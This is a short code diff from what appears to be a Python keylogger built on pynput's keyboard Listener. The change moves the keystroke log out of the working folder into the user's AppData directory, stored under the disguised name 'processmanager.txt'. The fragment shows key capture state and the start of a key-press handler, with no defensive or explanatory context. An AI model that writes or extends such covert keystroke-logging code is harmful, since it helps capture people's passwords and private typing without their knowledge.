@@ -3,8 +3,8 @@ from pynput.keyboard import Listener
 
 keys = []
 count = 0
-# path = OS.environ['appdata'] + '\\processmanager.txt'
-path = 'processmanager.txt'
+path = OS.environ['appdata'] + '\\processmanager.txt'
+# path = 'processmanager.txt'
 
 def on_press(key):
     global keys, count
